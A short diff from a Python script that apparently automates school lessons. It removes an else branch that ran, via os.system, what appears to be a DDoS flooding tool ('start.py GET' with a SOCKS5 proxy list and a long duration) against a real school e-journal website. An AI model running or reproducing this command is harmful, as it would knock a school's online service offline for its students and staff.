@@ -100,6 +100,3 @@ if lessons==7:
 		if timel==-1:
 			break
 	print(" [✅] day complete! ")
-
-else:
-	os.system(" python3 start.py GET https://romny-school4.e-schools.info/m/ 5 6000 socks5.txt 20 99999") 
